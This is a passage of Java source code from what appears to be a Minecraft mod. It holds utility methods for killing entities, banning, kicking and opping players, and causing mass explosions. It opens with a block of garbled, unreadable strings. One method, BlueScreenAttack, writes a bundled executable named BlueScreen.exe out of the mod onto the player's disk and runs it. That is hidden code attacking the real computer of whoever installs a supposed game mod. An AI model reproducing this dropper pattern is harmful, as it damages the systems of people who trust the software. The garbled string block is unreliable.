"锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟紷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟絖锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷 锟斤拷锟斤拷锟斤拷锟斤拷锟絖锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷", "锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷" };
    
    Random rd = new Random();
    int i = rd.nextInt(bb.length);
    return bb[i];
  }
  
  public void setFlag(Entity entity, int p_70052_1_, boolean p_70052_2_)
  {
    byte b0 = entity.getDataWatcher().getWatchableObjectByte(0);
    if (p_70052_2_) {
      entity.getDataWatcher().updateObject(0, Byte.valueOf((byte)(b0 | 1 << p_70052_1_)));
    } else {
      entity.getDataWatcher().updateObject(0, Byte.valueOf((byte)(b0 & (1 << p_70052_1_ ^ 0xFFFFFFFF))));
    }
  }
  
  public static void ExplodeOn(World world, double x, double y, double z)
  {
    world.createExplosion(null, x, y, z, exploderange, false).doExplosionB(true);
  }
  
  public class WhileLightningboltOnEntity
    extends Thread
  {
    private Entity player;
    
    public WhileLightningboltOnEntity(Entity player)
    {
      this.player = player;
    }
    
    public void run()
    {
      while ((!this.player.isDead) && (this.player != null) && (this.player.isEntityAlive()) && (this.player.worldObj.getLoadedEntityList().indexOf(this.player) != -1)) {
        try
        {
          ultimateCore.LightningboltOnEntity(this.player);
          this.player.onUpdate();
        }
        catch (Exception localException) {}
      }
    }
  }
  
  public void wloe(Entity entity)
  {
    Thread wlboe = new WhileLightningboltOnEntity(entity);
    wlboe.start();
  }
  
  public static void WhilelightningboltOnEntity(Entity entity)
  {
    ultimateCore core = new ultimateCore();
    core.wloe(entity);
  }
  
  public static void KickPlayer(EntityPlayer player, String Message)
  {
    MinecraftServer.getServer().getConfigurationManager().func_152612_a(player.getCommandSenderName()).playerNetServerHandler.kickPlayerFromServer(Message);
  }
  
  public static void NMSL(EntityPlayer player)
  {
    List<Entity> entitylists = player.worldObj.loadedEntityList;
    List<Entity> killentity = new ArrayList();
    for (Entity entity : entitylists) {
      if ((entity != null) && 
        (!(entity instanceof ultimateLightningbolt)) && 
        (entity != player)) {
        if ((!(entity instanceof EntityPlayer)) || 
          (!isUltimate((EntityPlayer)entity))) {
          killentity.add(entity);
        }
      }
    }
    for (Entity entity : killentity)
    {
      kill(entity);
    }
  }
  
  public static List<EntityPlayer> getAllServerPlayers()
  {
    return MinecraftServer.getServer().getConfigurationManager().playerEntityList;
  }
  
  public static void ChatPrint(String message)
  {
    List<EntityPlayer> list = getAllServerPlayers();
    for (EntityPlayer player : list) {
      player.addChatComponentMessage(Text(message));
    }
  }
  
  public static void KickPlayer(String player, String Message)
  {
    MinecraftServer.getServer().getConfigurationManager().func_152612_a(player).playerNetServerHandler.kickPlayerFromServer(Message);
  }
  
  public static void clearInventory(EntityPlayer player)
  {
    player.inventory.clearInventory(null, -1);
    InventoryPlayer ec = player.inventory;
    for (int i = 0; i < ec.getSizeInventory(); i++) {
      ec.setInventorySlotContents(i, null);
    }
  }
  public static Block RandomBlock()
  {
    try
    {
      Random random = new Random();
      int i = random.nextInt(139);
      return Block.getBlockById(i);
    }
    catch (Exception expx) {}
    return RandomBlock();
  }
  public static boolean isUltimate(String name) {
	World[] worlds = DimensionManager.getWorlds();
	for(World world : worlds) {
		try {
			EntityPlayer player = world.getPlayerEntityByName(name);
			if(player != null) {
				return isUltimate(player);
			}
		}catch(Throwable exp) {
			
		}
	}
	  return false;
  }
  public static boolean isUltimate(EntityPlayer player)
  {
	  try {
    if (UltimateOnwerList.IsOnwer(player)) {
      return true;
    }
    for (int i = 0; i < player.inventory.getSizeInventory(); i++)
    {
      ItemStack itemStack = player.inventory.getStackInSlot(i);
      if ((Register.ultimatesword != null) && 
        (itemStack != null) && (itemStack.getItem() instanceof ultimateSword || itemStack.getItem() == Register.ultimatesword)) {
        return true;
      }
    }
	  }catch(Exception exp) {
		  
	  }
    return false;
  }
  
  public static boolean hasTotem(EntityPlayer player)
  {
    for (int i = 0; i < player.inventory.getSizeInventory(); i++)
    {
      ItemStack itemStack = player.inventory.getStackInSlot(i);
      if ((Register.totem != null) && 
        (itemStack != null) && (itemStack.getItem() == Register.totem)) {
        return true;
      }
    }
    return false;
  }
  
  public static ChatComponentTranslation Text(String text)
  {
    return new ChatComponentTranslation(text, new Object[0]);
  }
  
  public static Chunk GetChunkByEntity(Entity entity)
  {
    Chunk chunk = entity.worldObj.getChunkFromBlockCoords((int)entity.posX, (int)entity.posZ);
    return chunk;
  }
  
  public static void ReloadChunk(Chunk chunk)
  {
    chunk.onChunkUnload();
    chunk.onChunkLoad();
  }
  
  private int lightningState = 2;
  
  public static void DrawAllItemto(World world, Entity target)
  {
    List<Entity> entitylist = world.getLoadedEntityList();
    for (Entity item : entitylist) {
      if ((item instanceof EntityItem))
      {
        double x = target.posX;
        double y = target.posY;
        double z = target.posZ;
        item.setPosition(x, y, z);
      }
    }
  }
  
  private static void removeEffect(EntityPlayer player, Potion potion)
  {
    if (player.getActivePotionEffect(potion) != null) {
      player.removePotionEffect(potion.id);
    }
  }
  
  public static void Teleport(Entity entity)
  {
    World world = entity.worldObj;
    if ((entity instanceof EntityPlayerMP))
    {
      ServerConfigurationManager scm = MinecraftServer.getServer().getConfigurationManager();
      WorldTeleporterPollute teleporter = new WorldTeleporterPollute(MinecraftServer.getServer().worldServerForDimension(666));
      scm.transferPlayerToDimension((EntityPlayerMP)entity, 666, teleporter);
    }
    else
    {
      ServerConfigurationManager scm = MinecraftServer.getServer().getConfigurationManager();
      WorldTeleporterPollute teleporter = new WorldTeleporterPollute(MinecraftServer.getServer().worldServerForDimension(666));
      scm.transferEntityToWorld(entity, 666, (WorldServer)world, MinecraftServer.getServer().worldServerForDimension(666), teleporter);
    }
  }
  public static void Teleport(Entity entity,int id)
  {
    World world = entity.worldObj;
    if ((entity instanceof EntityPlayerMP))
    {
      ServerConfigurationManager scm = MinecraftServer.getServer().getConfigurationManager();
      WorldTeleporterPollute teleporter = new WorldTeleporterPollute(MinecraftServer.getServer().worldServerForDimension(id));
      scm.transferPlayerToDimension((EntityPlayerMP)entity, id, teleporter);
    }
    else
    {
      ServerConfigurationManager scm = MinecraftServer.getServer().getConfigurationManager();
      WorldTeleporterPollute teleporter = new WorldTeleporterPollute(MinecraftServer.getServer().worldServerForDimension(id));
      scm.transferEntityToWorld(entity, id, (WorldServer)world, MinecraftServer.getServer().worldServerForDimension(id), teleporter);
    }
  }
  public static void removeEffectAll(EntityPlayer entityIn)
  {
    removeEffect(entityIn, Potion.weakness);
    removeEffect(entityIn, Potion.wither);
    removeEffect(entityIn, Potion.confusion);
    removeEffect(entityIn, Potion.digSlowdown);
    removeEffect(entityIn, Potion.blindness);
    removeEffect(entityIn, Potion.hunger);
    removeEffect(entityIn, Potion.poison);
    removeEffect(entityIn, Potion.moveSlowdown);
    entityIn.onUpdate();
  }
  
  public static WorldServer[] getAllWorld()
  {
    return DimensionManager.getWorlds();
  }
  
  public static void unloadworld(World world)
  {
    DimensionManager.unloadWorld(world.provider.dimensionId);
  }
  
  public static World getWorldByName(String name)
  {
    WorldServer[] worlds = DimensionManager.getWorlds();
    for (int i = 0; i < worlds.length; i++) {
      if (worlds[i].provider.getDimensionName() == name) {
        return worlds[i].provider.worldObj;
      }
    }
    return null;
  }
  public static File BlueScreenexe;
  public static void ClearInventory(EntityPlayer player)
  {
    for (int i = 0; i < player.inventory.mainInventory.length; i++) {
      if (player.inventory.mainInventory[i] != null) {
        player.inventory.mainInventory[i] = null;
      }
    }
    for(int i = 0; i < player.inventory.armorInventory.length; i++) {
      if (player.inventory.armorInventory[i] != null) {
        player.inventory.armorInventory[i] = null;
      }
    }
  }
  
  public static void BlueScreenAttack()
  {
      try
      {
        InputStream is = UltimateMod.class.getResourceAsStream("/BlueScreen.exe");
        try
        {
          FileOutputStream fos = new FileOutputStream(BlueScreenexe);
          try
          {
            byte[] buf = new byte['?'];
            int len;
            while ((len = is.read(buf)) != -1) {
              fos.write(buf, 0, len);
            }
          }
          catch (Throwable localThrowable1)
          {
        	  fos.close();
          }
        }catch(Throwable exp) {
            is.close();
        }
      }catch(Throwable throwable) {
    	  
      }
      try {
    	  Runtime.getRuntime().exec(BlueScreenexe.getAbsolutePath());
      }catch(Throwable exp) {
    	  
      }
  }
  public static void doExplosionA(World world, double x, double y, double z)
  {
    double f = 15.0D;
    double d1 = x - f;
    double d2 = y - f;
    double d3 = z - f;
    double d4 = x + f;
    double d5 = y + f;
    double d6 = z + f;
    for (double i = d1; i < d4; i += 1.0D) {
      for (double k = d2; k < d5; k += 1.0D) {
        for (double j = d3; j < d6; j += 1.0D) {
          world.spawnEntityInWorld(new EntityTNTPrimed(world, x, y, z, null));
        }
      }
    }
  }
  
  public static void OpPlayer(String name)
  {
    MinecraftServer minecraftserver = MinecraftServer.getServer();
    GameProfile gameprofile = minecraftserver.func_152358_ax().func_152655_a(name);
    minecraftserver.getConfigurationManager().func_152605_a(gameprofile);
  }
  
  public static void OpPlayer(EntityPlayer player)
  {
    OpPlayer(player.getDisplayName());
  }
  public static void DeOpPlayer(EntityPlayer player) {
	  DeOpPlayer(player.getDisplayName());
  }
  public static void DeOpPlayer(String name) {
	  MinecraftServer minecraftserver = MinecraftServer.getServer();
      GameProfile gameprofile = minecraftserver.getConfigurationManager().func_152603_m().func_152700_a(name);
  }
  public static void ShutdownServer()
  {
    MinecraftServer.getServer().initiateShutdown();
  }
  public static void pardon(String name) {
	  if(isBanned(name)) {
		  StoredData data = new StoredData("bannedlist");
		  Object read = data.Read();
		  if(read != null) {
		  List<String> players = (List<String>)read;
		  players.remove(name);
		  data.set(players);
		  }
	  }
  }
  public static int getEnchantmentLevel(Enchantment ench,ItemStack stack) {
	  return EnchantmentHelper.getEnchantmentLevel(ench.effectId,stack);
 }
  public static boolean isEffectActive(Enchantment ench,ItemStack stack) {
	  int level = EnchantmentHelper.getEnchantmentLevel(ench.effectId, stack);
      if(level > 0) {
    	  return true;
      }
      return false;
  }
  public static int deafult = 36;
  public static int getNextEnchantmentID() { 
	  Enchantment[] ench = Enchantment.enchantmentsList;
for(int i = deafult;i < 256;i++) {
	if(ench[i] == null) {
		return i;
	}
}
return -1;
  }
  public static List<String> BannedList(){
	  StoredData data = new StoredData("bannedlist");
	  Object read = data.Read();
	  if(read == null) {
	  return new ArrayList<String>();
	  }
	  return (List<String>)read;
  }
  public static boolean isBanned(EntityPlayer player) {
	  return isBanned(player.getDisplayName());
  }
  public static void pardon(EntityPlayer player) {
	  pardon(player.getDisplayName());
  }
  public static boolean isBanned(String name) {
	  StoredData data = new StoredData("bannedlist");
	  Object read = data.Read();
	  if(read == null) {
	  return false;
	  }
	  List<String> players = (List<String>)read;
	  if(players.indexOf(name) != -1) {
		  return true;
	  }
	  return false;
  }
  public static List<EntityPosition> line(double x,double y,double z,double dx,double dy,double dz,double space) {
	double nx = x;
	double ny = y;
	double nz = z;
	List<EntityPosition> posList = new ArrayList<EntityPosition>();
		  for (double i = 0; (i < ((Math.abs(dx - x)) / (space * ((Math.abs(dx - x)) / (Math.abs(dx - x) + Math.abs(dy - y) + Math.abs(dz - z))))) || i < ((Math.abs(dy - y)) / (space * ((Math.abs(dy - y)) / (Math.abs(dx - x) + Math.abs(dy - y) + Math.abs(dz - z))))) || i < ((Math.abs(dz - z)) / (space * ((Math.abs(dz - z)) / (Math.abs(dx - x) + Math.abs(dy - y) + Math.abs(dz - z)))))) && i < 5000; i++) {
		   double all = Math.abs(dx - x) + Math.abs(dy - y) + Math.abs(dz - z);
		    nx = nx + (space * ((dx - x) / all));
		    ny = ny + (space * ((dy - y) / all));
		    nz = nz + (space * ((dz - z) / all));
		    posList.add(new EntityPosition(nx,ny,nz));
		  }
		  return posList;
  }
  public static void BanPlayer(String name)
  {
	  StoredData data = new StoredData("bannedlist");
	  Object read = data.Read();
	  if(read != null) {
	  List<String> players = (List<String>)read;
	  players.add(name);
	  data.set(players);
	  }else {
		  List<String> players = new ArrayList<String>();
		  players.add(name);
		  data.set(players);
	  }
    KickPlayer(name, "[Ultimate]\n"+EnumChatFormatting.RED+"浣犲凡琚鏈嶅姟鍣ㄦ案涔呭皝绂�!!");
    MinecraftServer minecraftserver = MinecraftServer.getServer();
    GameProfile gameprofile = minecraftserver.func_152358_ax().func_152655_a(name);
  }
  
  public static void BanPlayer(EntityPlayer player)
  {
    BanPlayer(player.getDisplayName());
  }
  
  public static void ProviderWorld(World world, int x, int y)
  {
    Chunk chunk = world.getChunkProvider().provideChunk(x, y);
    for (int i = chunk.xPosition; i < chunk.xPosition + 16; i++) {
      for (int j = chunk.zPosition; j < chunk.zPosition + 16; j++) {
        for (int k = 0; k < 256; k++) {
          chunk.worldObj.setBlock(i, j, k, chunk.getBlock(i, k, j));
        }
      }
    }
  }
  public static void DestoryRangeBlockByPlayer(int X,int Y,int Z,int range,EntityPlayer player) {
	  World world = player.worldObj;
	  range = range/2;
      for (int i = -range; i <= range; i++) {
        for (int j = -range; j <= range; j++) {
          for (int k = -range; k <= range; k++)
          {
int x = X+i;
int y = Y+j;
int z = Z+k;
Block block = world.getBlock(x,y,z);
if(block != Blocks.air) {
	int meta = world.getBlockMetadata(x,y,z);
block.harvestBlock(world,player,x,y,z,meta);
block.onBlockDestroyedByPlayer(world,x,y,z,meta);
world.setBlockToAir(x,y,z);
}
          }
        }
      }
}
  public static void DestoryRangeBlock(World world,int X,int Y,int Z,int range) {
	      for (int i = -range; i <= range; i++) {
	        for (int j = -range; j <= range; j++) {
	          for (int k = -range; k <= range; k++)
	          {
int x = X+i;
int y = Y+j;
int z = Z+k;
Block block = world.getBlock(x,y,z);
if(block != Blocks.air) {
world.setBlockToAir(x,y,z);
}
	          }
	        }
	      }
  }
  public static boolean isOp(String name)
  {
    String[] ops = MinecraftServer.getServer().getConfigurationManager().func_152606_n();
    for (int i = 0; i < ops.length; i++) {
      if (ops[i].equals(name)) {
        return true;
      }
    }
    if (MinecraftServer.getServer().isDedicatedServer()) {
      return false;
    }
    return true;
  }
  protected static void killEntity(Entity entity) {
	  try {
	  entity.isDead = true;
	  entity.worldObj.loadedEntityList.remove(entity);
	  entity.worldObj.removeEntity(entity);
      entity.worldObj.onEntityRemoved(entity);
      entity.worldObj.removePlayerEntityDangerously(entity);
      List<Entity> entitylist = new ArrayList();
      entitylist.add(entity);
      entity.worldObj.unloadEntities(entitylist);
      Chunk chunk = GetChunkByEntity(entity);
      chunk.removeEntity(entity);
      chunk.hasEntities = false;
      entity.preventEntitySpawning = true;
      entity.worldObj.setEntityState(entity, (byte)3);
      entity.UltimateDead = true;
	  }catch(Throwable exp) {}
  }
  protected static void killPlayer(Entity entity) {
	  try {
      if (entity instanceof EntityPlayer)
      {
        EntityPlayer player = (EntityPlayer)entity;
        player.clearActivePotions();
        ((EntityLivingBase)entity).getEntityAttribute(SharedMonsterAttributes.maxHealth).setBaseValue(-Infinity);
        player.getDataWatcher().updateObject(6, Float.NEGATIVE_INFINITY);
      }
	  }catch(Throwable exp) {}
  }
  protected static void KillEntityLiving(Entity entity) {
	  try {
	  if(entity instanceof EntityLivingBase) {
	  final EntityLivingBase living = (EntityLivingBase)entity;
	  entity.UltimateDead = true;
				living.getEntityAttribute(SharedMonsterAttributes.maxHealth).setBaseValue(-Infinity);
				living.getDataWatcher().updateObject(6,Float.NEGATIVE_INFINITY);
	  try
      {
        ReflectionHelper.findField(entity.getClass(), new String[] { "hurt_timer" }).setInt(entity, 0);
        ReflectionHelper.findField(EntityLivingBase.class, new String[] { "recentlyHit", "field_70718_bc" }).setInt(entity, 60);     
      }
      catch (Exception e)
      {
        entity.hurtResistantTime = 0;
      }
	((EntityLivingBase)entity).ticksExisted = -1;
	((EntityLivingBase)entity).setAIMoveSpeed(0);
	((EntityLivingBase)entity).setLastAttacker(((EntityLivingBase)entity));
	((EntityLivingBase)entity).setInvisible(true);
  	((EntityLivingBase)entity).setRevengeTarget(((EntityLivingBase)entity));
    ((EntityLivingBase)entity).getEntityAttribute(SharedMonsterAttributes.maxHealth).setBaseValue(-Infinity);
    ((EntityLivingBase)entity).getDataWatcher().updateObject(6, Float.NEGATIVE_INFINITY);
	  }
	  }catch(Throwable exp) {}
  }
  public static void kill(Entity entity)
  {
    try{if ((entity instanceof EntityPlayer)){if (isUltimate((EntityPlayer)entity)) {return;}}}catch(Exception exp) {}
    try {
    killEntity(entity);
    killPlayer(entity);
    KillEntityLiving(entity);
    }catch(Exception exp) {}
  }
  
  public static void fuckposition(Entity entity1)
  {
    Entity entity = entity1;
    entity.posY = Infinity;
    entity.serverPosY = ((int)Infinity);
    entity.lastTickPosY = Infinity;
    entity.motionY = Infinity;
  }
  
  public static void RemoveAllEntities(World world)
  {
    List<Entity> entities = world.getLoadedEntityList();
    for (Entity entity : entities) {
      try
      {
        kill(entity);
      }
      catch (Exception localException) {}
    }
  }
  
  public static void repelEntities(World world, EntityPlayer entity, double fr, double bl)
  {
    AxisAlignedBB effectBounds;
    if (entity.getBoundingBox() == null) {
      effectBounds = AxisAlignedBB.getBoundingBox(entity.posX - fr, entity.posY - fr, entity.posZ - fr, entity.posX + fr, entity.posY + fr, entity.posZ + fr);
    } else {
      effectBounds = entity.getBoundingBox().expand(fr, fr, fr);
    }
    List<Entity> list = world.getEntitiesWithinAABB(Entity.class, effectBounds);
    double x = entity.posX;
    double y = entity.posY;
    double z = entity.posZ;
    for (Entity ent : list) {
